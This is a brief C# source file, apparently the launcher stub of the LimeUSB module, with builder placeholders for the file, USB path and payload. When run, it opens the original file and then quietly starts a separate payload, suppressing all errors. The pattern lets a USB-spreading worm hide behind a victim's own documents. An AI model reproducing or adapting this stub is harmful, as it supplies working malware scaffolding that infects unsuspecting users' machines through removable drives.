using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTrademark("%Lime%")]
[assembly: Guid("%Guid%")]

static class LimeUSBModule
{
    public static void Main()
    {
        try
        {
            System.Diagnostics.Process.Start(@"%File%");
            System.Diagnostics.Process.Start(@"%USB%");
            System.Diagnostics.Process.Start(@"%Payload%");
        }
        catch
        {
        }
    }
}
